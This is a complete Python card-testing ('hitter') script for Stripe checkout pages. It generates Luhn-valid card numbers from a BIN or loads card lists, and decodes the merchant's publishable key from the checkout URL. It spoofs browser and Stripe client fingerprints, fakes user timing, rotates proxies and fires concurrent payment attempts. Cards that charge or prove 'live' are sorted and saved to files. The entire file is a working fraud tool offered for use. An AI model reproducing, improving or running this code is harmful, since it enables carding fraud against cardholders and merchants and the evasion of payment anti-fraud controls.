import os, re, sys, time, random, json, asyncio
import base64
from datetime import datetime
from urllib.parse import urlparse, unquote, quote

import aiohttp
import colorama
from colorama import Fore, Style
from pystyle import Colors, Colorate, Write


colorama.init(autoreset=True)



API_HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site"
}



def _luhn_check(partial: str) -> str:
    for d in range(10):
        test  = partial + str(d)
        total = 0
        rev   = test[::-1]
        for i, ch in enumerate(rev):
            n = int(ch)
            if i % 2 == 1:
                n *= 2
                if n > 9: n -= 9
            total += n
        if total % 10 == 0:
            return str(d)
    return "0"

def _get_card_len(card: str) -> int:
    prefix2 = re.sub(r"\D", "", card)[:2]
    prefix3 = re.sub(r"\D", "", card)[:3]
    if prefix2 in ("34", "37"): return 15
    if prefix2 in ("30", "36", "38") or prefix3 in ("300", "305"): return 14
    return 16

def _is_amex(card: str) -> bool:
    prefix = re.sub(r"\D", "", card)[:2]
    return prefix in ("34", "37")

def generate_card(bin_pattern: str) -> dict:
    parts   = bin_pattern.strip().split("|")
    raw_bin = re.sub(r"[^0-9xX]", "", parts[0])
    mm_pat  = parts[1].strip() if len(parts) > 1 else None
    yy_pat  = parts[2].strip() if len(parts) > 2 else None
    cvv_pat = parts[3].strip() if len(parts) > 3 else None

    card = "".join(str(random.randint(0,9)) if c in "xX" else c for c in raw_bin)
    tlen = _get_card_len(card)
    
    if len(card) >= tlen:
        card = card[:tlen-1]
    
    while len(card) < tlen - 1:
        card += str(random.randint(0, 9))
        
    card += _luhn_check(card)

    yr_now = datetime.now().year
    def rnd_mm():  return str(random.randint(1, 12)).zfill(2)
    def rnd_yy():  return str(yr_now + random.randint(1, 6))[-2:]
    def rnd_cvv(): return str(random.randint(0, 9999 if _is_amex(card) else 999)).zfill(4 if _is_amex(card) else 3)

    mm  = rnd_mm()  if not mm_pat  or mm_pat.upper()  in ("XX","X","")  else str(int(mm_pat)).zfill(2)
    yy  = rnd_yy()  if not yy_pat  or yy_pat.upper()  in ("XX","X","")  else str(int(yy_pat))[-2:]
    cvv = rnd_cvv() if not cvv_pat or cvv_pat.upper() in ("XXX","XXXX","RND","RANDOM","") else \
          re.sub(r"[xX]", lambda _: str(random.randint(0,9)), cvv_pat)

    yyyy = "20" + yy if len(yy) == 2 else yy
    return {"cc": card, "month": mm, "year": yy, "cvv": cvv,
            "full": f"{card}|{mm}|{yyyy}|{cvv}"}



def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            
            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
    except Exception:
        pass
    
    return result

def gen_uuid():
    return f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(16):04x}-{random.getrandbits(48):012x}"

def get_stripe_ua():
    ua = {
        "lang": "javascript",
        "browser": {
            "name": "Chrome", "version": "123.0.0.0", "major": "123",
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "language": "en-US", "engine": "Blink"
        },
        "device": {"name": "Windows", "version": "10", "platform": "Win32"},
        "publisher": "stripe",
        "version": "2020-08-27"
    }
    return json.dumps(ua)

def parse_proxy(raw: str):
    if not raw: return None, None
    raw = raw.strip()
    if raw.startswith("http://") or raw.startswith("https://"):
        parsed = urlparse(raw)
        if parsed.username:
            auth = aiohttp.BasicAuth(login=parsed.username, password=parsed.password or "", encoding="latin1")
            clean = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
            return clean, auth
        return raw, None
    if "@" in raw:
        creds, hostpart = raw.rsplit("@", 1)
        user, _, msg = creds.partition(":")
        auth = aiohttp.BasicAuth(login=user, password=msg, encoding="latin1")
        return f"http://{hostpart}", auth
    parts = raw.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            h, p, u, pw = parts
        else:
            u, pw, h, p = parts
        auth = aiohttp.BasicAuth(login=u, password=pw, encoding="latin1")
        return f"http://{h}:{p}", auth
    return f"http://{raw}", None


class AsyncStripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy_url, self.proxy_auth = parse_proxy(proxy)
        self.pk = None
        self.cs = None
        self.init_data = {}
        self.merchant = "Stripe Checkout"
        self.amount_str = "N/A"
        self.currency = "USD"
        self.session = None
        self.tracking = {
            "muid": gen_uuid(),
            "sid":  gen_uuid(),
            "guid": gen_uuid()
        }
        

    def _get_headers(self):
        hdrs = API_HEADERS.copy()
        hdrs["Referer"] = self.url
        hdrs["Authorization"] = f"Bearer {self.pk}"
        
        ua_data = {
            "lang": "javascript",
            "browser": {
                "name": "Chrome", "version": "123.0.0.0", "major": "123",
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
                "language": "en-US", "engine": "Blink"
            },
            "device": {
                "name": "Windows", "version": "10", "platform": "Win32",
                "hardwareConcurrency": random.choice([4, 8, 12, 16]),
                "deviceMemory": random.choice([8, 16, 32]),
                "screen": {"width": 1920, "height": 1080, "colorDepth": 24}
            },
            "publisher": "stripe",
            "version": "2020-08-27",
            "url": self.url
        }
        ua_json = json.dumps(ua_data)
        hdrs["X-Stripe-User-Agent"] = ua_json
        hdrs["X-Stripe-Client-User-Agent"] = ua_json
        return hdrs

    async def init_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=100, ssl=False, ttl_dns_cache=300),
                timeout=aiohttp.ClientTimeout(total=25, connect=8)
            )

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def prefetch(self) -> bool:
        await self.init_session()
        
        decoded = decode_pk_from_url(self.url)
        self.pk = decoded.get("pk")
        self.cs = decoded.get("cs")

        if not self.pk or not self.cs:
            try:
                async with self.session.get(self.url, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                    html = await r.text()
                    if not self.cs:
                        m1 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
                        if m1: self.cs = m1.group(0)
                    if not self.pk:
                        m2 = re.search(r'pk_(live|test)_[A-Za-z0-9]+', html)
                        if m2: self.pk = m2.group(0)
            except: pass

        if not self.cs:
            print(f"  {Fore.RED}[!] Could not extract CS from URL.")
            return False

        if not self.pk:
            user_pk = input(f"  {Fore.GREEN}  Enter pk_live manually: {Style.RESET_ALL}").strip()
            if user_pk.startswith("pk_"): self.pk = user_pk
            else: return False

        print(f"  {Fore.GREEN}[+] PK  : {Fore.WHITE}{self.pk[:40]}...")
        print(f"  {Fore.GREEN}[+] CS  : {Fore.WHITE}{self.cs[:40]}...")

        body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        try:
            async with self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                headers=self._get_headers(), data=body, proxy=self.proxy_url, proxy_auth=self.proxy_auth
            ) as r:
                init_data = await r.json()
        except Exception as e:
            print(f"  {Fore.RED}[!] Init failed: {e}")
            return False

        if "error" in init_data:
            print(f"  {Fore.RED}[!] Init Error: {init_data['error'].get('message')}")
            return False

        acc = init_data.get("account_settings", {})
        self.merchant = acc.get("display_name") or acc.get("business_name") or "Stripe Checkout"
        
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        
        amt_value = 0
        if lig:
            amt_value = lig.get("total", 0)
            self.currency = lig.get("currency", "usd").upper()
        elif inv:
            amt_value = inv.get("total", 0)
            self.currency = inv.get("currency", "usd").upper()
        else:
            pi = init_data.get("payment_intent") or {}
            amt_value = pi.get("amount", 0)
            self.currency = pi.get("currency", "usd").upper()

        if amt_value > 0:
            if self.currency in ("JPY", "KRW", "VND", "IDR"):
                self.amount_str = f"{amt_value} {self.currency}"
            else:
                self.amount_str = f"{amt_value/100:.2f} {self.currency}"
        else:
            self.amount_str = "Trial"
        
        return True

    async def _get_fresh_cs(self) -> str:
        try:
            async with self.session.get(self.url, proxy=self.proxy_url, proxy_auth=self.proxy_auth, allow_redirects=True) as r:
                url_after = str(r.url)
                html = await r.text()
                
                m1 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url_after)
                if m1: return m1.group(0)
                
                m2 = re.search(r'cs_(live|test)_[A-Za-z0-9]+', html)
                if m2: return m2.group(0)
        except:
            pass
        return self.cs


    async def charge_card(self, card: dict) -> dict:
        result = {
            "card": card["full"],
            "status": "ERROR",
            "message": "Unknown error"
        }
        
        try:
            cs_to_use = self.cs
            if "cs_live_" not in self.url and "cs_test_" not in self.url:
                fresh_cs = await self._get_fresh_cs()
                if fresh_cs:
                    cs_to_use = fresh_cs
            
            init_body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
            async with self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/init",
                headers=self._get_headers(), data=init_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth
            ) as r:
                init_data = await r.json()

            if "error" in init_data:
                result["status"] = "DECLINED"
                result["message"] = init_data["error"].get("message", "Init failed")
                return result

            email = init_data.get("customer_email") or f"john_{random.randint(100,999)}@example.com"
            checksum = init_data.get("init_checksum", "")
            
            lig = init_data.get("line_item_group")
            inv = init_data.get("invoice")
            if lig:
                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
            elif inv:
                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
            else:
                pi = init_data.get("payment_intent") or {}
                total = subtotal = pi.get("amount", 0)
            
            cust = init_data.get("customer") or {}
            addr = cust.get("address") or {}
            name = cust.get("name") or "John Smith"
            country = addr.get("country") or "US"
            line1 = addr.get("line1") or "476 West White Mountain Blvd"
            city = addr.get("city") or "Pinetop"
            state = addr.get("state") or "AZ"
            zip_code = addr.get("postal_code") or "85929"
            
            self.session.cookie_jar.update_cookies({
                "__stripe_mid": self.tracking["muid"],
                "__stripe_sid": self.tracking["sid"]
            })

            pm_body = (
                f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}"
                f"&card[exp_month]={card['month']}&card[exp_year]={card['year'][-2:]}"
                f"&billing_details[name]={quote(name)}&billing_details[email]={quote(email)}"
                f"&billing_details[address][country]={country}&billing_details[address][line1]={quote(line1)}"
                f"&billing_details[address][city]={quote(city)}&billing_details[address][postal_code]={zip_code}"
                f"&billing_details[address][state]={state}&key={self.pk}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
                f"&payment_user_agent={quote('stripe.js/f5e714652c; stripe-js-v3/f5e714652c; checkout')}"
                f"&time_on_page={random.randint(25000, 55000)}"
                f"&pasted_fields={quote('number')}"
            )
            
            async with self.session.post("https://api.stripe.com/v1/payment_methods", headers=self._get_headers(), data=pm_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                pm = await r.json()
            
            if "error" in pm:
                result["status"] = "DECLINED"
                result["message"] = pm["error"].get("message", "Card tokenization error")
                return result
            
            pm_id = pm.get("id")
            if not pm_id:
                result["status"] = "ERROR"
                result["message"] = "No Payment Method returned"
                return result
            
            conf_body = (
                f"eid=NA&payment_method={pm_id}&expected_amount={total}"
                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                f"&expected_payment_method_type=card&key={self.pk}&init_checksum={quote(checksum)}"
                f"&muid={self.tracking['muid']}&sid={self.tracking['sid']}&guid={self.tracking['guid']}"
            )
            
            async with self.session.post(f"https://api.stripe.com/v1/payment_pages/{cs_to_use}/confirm", headers=self._get_headers(), data=conf_body, proxy=self.proxy_url, proxy_auth=self.proxy_auth) as r:
                conf = await r.json()
            
            if "error" in conf:
                err = conf["error"]
                dc = err.get("decline_code", "")
                msg = err.get("message", "Failed")
                
                if "captcha" in msg.lower() or err.get("code") == "captcha_required":
                    result["status"] = "HCAPTCHA"
                    result["message"] = "Hcaptcha Required"
                elif dc == "challenge_required" or err.get("code") == "challenge_required" or dc == "require_action" or err.get("code") == "require_action":
                    result["status"] = "3DS"
                    result["message"] = "3DS"
                elif dc in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or \
                     any(x in msg.lower() for x in ["security code is incorrect", "insufficient funds", "cvc is incorrect", "cvv is incorrect", "incorrect cvv"]):
                    result["status"] = "LIVE"
                    result["message"] = f"{dc.upper()}: {msg}" if dc else msg
                else:
                    result["status"] = "DECLINED"
                    result["message"] = f"{dc.upper()}: {msg}" if dc else msg
            else:
                pi = conf.get("payment_intent") or {}
                st = pi.get("status", "") or conf.get("status", "")
                
                if st == "succeeded":
                    result["status"] = "CHARGED"
                    result["message"] = "Payment successful"
                elif st == "requires_action":
                    result["status"] = "3DS"
                    result["message"] = "3DS"
                elif st == "requires_payment_method":
                    err_pi = pi.get("last_payment_error") or {}
                    code = err_pi.get("decline_code", "")
                    msg = err_pi.get("message", "Card declined")
                    
                    if "captcha" in msg.lower() or code == "captcha_required":
                        result["status"] = "HCAPTCHA"
                        result["message"] = "Hcaptcha Required"
                    elif code in ("incorrect_cvc", "insufficient_funds", "incorrect_cvv") or \
                         any(x in msg.lower() for x in ["security code is incorrect", "insufficient funds", "cvc is incorrect", "cvv is incorrect", "incorrect cvv"]):
                        result["status"] = "LIVE"
                        result["message"] = f"{code} - {msg}"
                    else:
                        result["status"] = "DECLINED"
                        result["message"] = f"{code} - {msg}"
                else:
                    result["status"] = "ERROR"
                    result["message"] = f"Unknown status: {st}"
                    
        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = str(e)[:60]
            
        return result



def clear(): os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    banner_text = r"""
  ███████╗████████╗██████╗ ██╗██████╗ ███████╗    ██╗  ██╗██╗████████╗████████╗███████╗██████╗ 
  ██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝    ██║  ██║██║╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗
  ███████╗   ██║   ██████╔╝██║██████╔╝█████╗      ███████║██║   ██║      ██║   █████╗  ██████╔╝
  ╚════██║   ██║   ██╔══██╗██║██╔═══╝ ██╔══╝      ██╔══██║██║   ██║      ██║   ██╔══╝  ██╔══██╗
  ███████║   ██║   ██║  ██║██║██║     ███████╗    ██║  ██║██║   ██║      ██║   ███████╗██║  ██║
  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝    ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝
                     Created by @Xoarch | @ScriptDung
"""
    print(Colorate.Vertical(Colors.red_to_white, banner_text))

def sep(n=70): print(Fore.CYAN + "─" * n + Style.RESET_ALL)

STATUS_FMT = {
    "CHARGED":   (Fore.GREEN,   "Charged"),
    "LIVE":      (Fore.CYAN,    "Live"),
    "DECLINED":  (Fore.RED,     "Declined"),
    "3DS":       (Fore.YELLOW,  "3DS"),
    "HCAPTCHA":  (Fore.BLUE,    "Hcaptcha"),
    "ERROR":     (Fore.MAGENTA, "Error"),
}

print_lock = asyncio.Lock()

async def print_result(r: dict, idx: int, total: int, merchant: str, amount: str):
    async with print_lock:
        col, lbl = STATUS_FMT.get(r["status"], (Fore.WHITE, r["status"]))
        
        print(f"{Fore.CYAN}[{idx}/{total}]")
        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗖𝗖        :   {Fore.WHITE}{r['card']}")
        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗦𝘁𝗮𝘁𝘂𝘀    :   {col}{lbl}")
        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  :     {Fore.WHITE}{r['message']}")

        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗔𝗺𝗼𝘂𝗻𝘁    :   {Fore.WHITE}{amount}")
        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁  :     {Fore.WHITE}{merchant}")
        print(f"{Fore.CYAN}「❃」{Fore.WHITE}𝗗𝗘𝗩       :   {Fore.WHITE}@Xoarch")
        print()

def print_summary(stats: dict, total: int, elapsed: float, save_path: str):
    sep()
    print(f"\n  {Style.BRIGHT}{Fore.WHITE}═══ RESULTS ════════════════════════════════════")
    print(f"  {Fore.GREEN}  Charged   : {stats['success']}")
    print(f"  {Fore.CYAN}  Live      : {stats['live']}")
    print(f"  {Fore.YELLOW}  3DS       : {stats['3ds']}")
    print(f"  {Fore.RED}  Declined  : {stats['declined']}")
    print(f"  {Fore.BLUE}  Hcaptcha  : {stats['hcaptcha']}")
    print(f"  {Fore.MAGENTA}  Error     : {stats['error']}")
    print(f"  {Fore.WHITE}  TOTAL     : {total}")
    print(f"  {Fore.CYAN}  TIME      : {elapsed:.1f}s")
    print()
    if stats["success"]:
        print(f"  {Fore.GREEN}  [+] Charged Saved : {Fore.WHITE}charged.txt")
    if stats["live"]:
        print(f"  {Fore.CYAN}  [+] Live Saved    : {Fore.WHITE}live.txt")
    sep()
    print()



async def run_checker():
    try:
        banner()

        print(Colorate.Horizontal(Colors.red_to_white, "  [1] CC", 1))
        print(Colorate.Horizontal(Colors.red_to_white, "  [2] BIN", 1))
        print(Colorate.Horizontal(Colors.red_to_white, "  [3] EXIT", 1))
        print()
        
        while True:
            mode_input = input(Colorate.Horizontal(Colors.red_to_white, "  [?] Mode (1/2/3): ", 1)).strip()
            if mode_input in ("1", "2", "3"):
                choice = mode_input
                break
            print(f"  {Fore.RED}Please choose 1, 2, or 3")

        cards = []
        if choice == "1":
            while True:
                path = input(Colorate.Horizontal(Colors.red_to_white, "  [?] CC File Path: ", 1)).strip().strip('"')
                if os.path.isfile(path):
                    break
                print(f"  {Fore.RED}File not found. Please enter a valid path.")

            temp_cards = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for l in f:
                    l = l.strip()
                    if "|" in l:
                        p = re.split(r'[|:/\\\-\s]+', l)
                        if len(p) >= 4:
                            month = str(p[1]).zfill(2)
                            year = "20" + str(p[2])[-2:]
                            temp_cards.append({"cc": p[0], "month": month, "year": year[-2:], "cvv": p[3], "full": f"{p[0]}|{month}|{year}|{p[3]}"})
            
            cards = temp_cards
            print(f"  {Fore.GREEN}[+] Loaded {len(cards)} Card(s)!")
        elif choice == "2":
            while True:
                bin_in = input(Colorate.Horizontal(Colors.red_to_white, "  [?] BIN: ", 1)).strip()
                if bin_in: break
                print(f"  {Fore.RED}Please Enter bin")
                
            while True:
                n_str = input(Colorate.Horizontal(Colors.red_to_white, "  [?] Amount [default 10]: ", 1)).strip()
                if not n_str:
                    n = 10
                    break
                if n_str.isdigit():
                    n = int(n_str)
                    break
                print(f"  {Fore.RED}Please enter a numeric amount.")

            cards = [generate_card(bin_in) for _ in range(n)]
            print(f"  {Fore.GREEN}[+] Generated {n} Card(s)!")
        elif choice == "3": sys.exit()

        print()
        while True:
            co_url = input(Colorate.Horizontal(Colors.red_to_white, "  [?] Checkout URL: ", 1)).strip()
            if co_url: break
            print(f"  {Fore.RED}Please enter a checkout URL")

        proxy = input(Colorate.Horizontal(Colors.red_to_white, "  [?] Proxy (blank for none): ", 1)).strip()
        
        while True:
            thread_count = input(Colorate.Horizontal(Colors.red_to_white, "  [?] Threads [default 1]: ", 1)).strip()
            if not thread_count:
                limit = 1
                break
            if thread_count.isdigit():
                limit = int(thread_count)
                break
            print(f"  {Fore.RED}Please enter a valid number for threads.")
        
        sep()
        checker = AsyncStripeChecker(co_url, proxy)
        print(Colorate.Horizontal(Colors.red_to_white, "\n  Fetching checkout details...\n", 1))
        if not await checker.prefetch():
            await checker.close()
            return

        print(f"  {Fore.GREEN}[+] Amount   : {Fore.WHITE}{checker.amount_str}")
        print(f"  {Fore.GREEN}[+] Merchant : {Fore.WHITE}{checker.merchant}")
        sep()

        stats = {"success": 0, "live": 0, "declined": 0, "3ds": 0, "hcaptcha": 0, "error": 0}
        t_start = time.time()
        
        semaphore = asyncio.Semaphore(limit)
        idx_counter = [0]

        async def worker(card_data):
            async with semaphore:
                idx_counter[0] += 1
                current_idx = idx_counter[0]
                
                res = await checker.charge_card(card_data)
                await print_result(res, current_idx, len(cards), checker.merchant, checker.amount_str)
                
                if res["status"] == "CHARGED":
                    stats["success"] += 1
                    with open("charged.txt", "a", encoding="utf-8") as f:
                        f.write(f"「❃」𝗖𝗖        :   {res['card']}\n「❃」𝗦𝘁𝗮𝘁𝘂𝘀    :   Charged\n「❃」𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  :     {res['message']}\n「❃」𝗔𝗺𝗼𝘂𝗻𝘁    :   {checker.amount_str}\n「❃」𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁  :     {checker.merchant}\n「❃」𝗗𝗘𝗩       :   @Xoarch\n\n")
                elif res["status"] == "LIVE":
                    stats["live"] += 1
                    with open("live.txt", "a", encoding="utf-8") as f:
                        f.write(f"「❃」𝗖𝗖        :   {res['card']}\n「❃」𝗦𝘁𝗮𝘁𝘂𝘀    :   Live\n「❃」𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲  :     {res['message']}\n「❃」𝗔𝗺𝗼𝘂𝗻𝘁    :   {checker.amount_str}\n「❃」𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁  :     {checker.merchant}\n「❃」𝗗𝗘𝗩       :   @Xoarch\n\n")
                elif res["status"] == "3DS": stats["3ds"] += 1
                elif res["status"] == "DECLINED": stats["declined"] += 1
                elif res["status"] == "HCAPTCHA": stats["hcaptcha"] += 1
                else: stats["error"] += 1

        try:
            tasks = [asyncio.create_task(worker(c)) for c in cards]
            await asyncio.gather(*tasks)
        finally:
            await checker.close()
        
        elapsed = time.time() - t_start
        print_summary(stats, len(cards), elapsed, "charged.txt")
        
    except EOFError:
        print(f"\n  {Fore.RED}[!] Session Ended.")
    except Exception as e:
        print(f"\n  {Fore.RED}[!] Error: {e}")

def main():
    try:
        if sys.platform == 'win32':
            sys.stdout.reconfigure(encoding='utf-8')
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        asyncio.run(run_checker())
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
